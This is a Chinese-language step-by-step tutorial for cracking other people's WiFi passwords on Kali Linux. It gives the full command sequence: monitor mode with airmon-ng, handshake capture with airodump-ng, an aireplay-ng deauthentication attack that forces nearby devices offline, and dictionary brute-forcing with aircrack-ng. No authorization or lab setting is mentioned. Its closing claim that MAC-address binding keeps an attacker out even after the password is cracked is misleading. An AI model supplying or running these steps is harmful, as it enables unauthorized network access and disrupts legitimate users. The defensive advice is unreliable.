# 利用Kali系统破解WiFi密码

> Kali官网 <https://www.kali.org/>

# 一、准备工作

Kali系统+可以抓包并且能在Kali系统识别的无线网卡

# 二、具体步骤

打开终端，输入以下命令进入管理员权限

```shell
sudo -i
```

查看当前的网卡信息

```shell
ifconfig
```

如果看到wlan0，则说明无线网卡已经正常驱动并识别到了。如果没有wlan0。说明无线网卡是没有安装成功的。可以重新拔插一下无线网卡、或者是该无线网卡是不支持Kali系统的。

在开始之前确保当前的主机是没有连接任何Wifi网络连接。也就是wlan0后面没有带任何ip地址。接着输入以下命令来检查网卡是否支持监听功能的。

```shell
airmon-ng
```

如果显示出wlan0。代表当前的网卡支持监听模式的。然后输入以下命令来激活无线网卡的 监听模式

```shell
airmon-ng start wlan0
```

接着再次输入ifconfig来查看当前监听的网卡

```shell
ifconfig
```

出现wlan0或者wlan0mon。出现什么后面命令就用什么

接着输入以下命令扫描当前周边环境的WiFi信号

```shell
airodump-ng wlan0
```

当搜索到我们想要破解的Wifi时。通过快捷键 Ctrl+C 来停止搜索

这里需要记录一下想要破解wifi信号的BSSID和CH（Wifi的频段）

接着输入抓包命令进行抓包。这里在桌面生成抓包到的 `handshake` 也就是数据包

```shell
airodump-ng -c [Wifi的频段] --bssid [Wifi的BSSID] -w ./桌面/handshake wlan0
```

但是呢这样的抓包方式是一种被动的等待模式，多长时间能够抓到握手包，主要依赖于什么时候有设备和这个wifi完成成功的认证。这是一种守株待兔的方式，抓包时间一般是比较长的。所以现在我们使用另外一种更快的方式，可以促进它加速完成——通过ACK死亡攻击。把它们踢下线。因为wifi都有自动登入功能，我们把它踢下线以后，它会自动重新登入，在它重新登录的时候我们就可以立马抓到包了。这样可以大大缩短我们整个破解过程。

打开一个新的命令终端，同样给一个管理员权限。但是之前抓包的命令窗口不要关闭。输入一个非常简单的攻击命令

```shell
aireplay-ng -0 10 -a [需要破解Wifi的BSSID] -c [需要踢下线的设备] wlan0

0:通知设备断开连接
10:代表攻击次数

需要踢下线的设备可以在抓包命令窗口找一个，就是STATION这个参数下面任意一个
```

攻击开始以后，稍微等一会。当抓包命令窗口出现 WPA handshake 的字样时就说明抓包成功了。可以通过快捷键 Ctrl+C 来退出当前抓包命令。这个时候桌面上有4个新生成的文件。这里主要用到的是这个cap文件。有了这个抓包成功后的文件，接下来就是暴力破解的过程。

现在需要准备一个强有力的密码字典。这种字典其实在GitHub上是有人搜集并共享的。

>  例如：<https://github.com/conwnet/wpa-dictionary>
>  

把这些密码字典合并到一起。可能里面有重复的密码，这里我们可以通过txt文本去重。把里面重复的密码给它去除掉，这里合并成password.txt文件。接着把该文件拖入到Kali系统的桌面上。

暴力破解命令

```shell
aircrack-ng -w ./桌面/password.txt -b [需要破解wifi信号的bssid] ./桌面/handshake-0*.cap

handshake就是刚刚抓包抓到的文件。
```

这个破解速度主要取决于电脑的硬件配置。当然最关键的还是密码字典。如果你的密码字典足够大，而且在密码字典中存在这个wifi密码那就能100%破解出这个wifi密码，如果不含的话，那肯定是找不到。所以换句来说，wifi密码的破解成功率主要取决于使用的密码字典的大小

# 三、总结

这个世上没有绝对的安全，虽然可以设置一个更长一点的WiFi密码来防止别人的暴力破解，但是这种方法最多只能是延长别人的破解时间而已，它是没法杜绝别破解的。目前来说，要防止别破解的最好方法就是在路由器里绑定连接设备的MAC地址，这样即使别人破解了你的WiFi密码，它也是无法连接上网的。
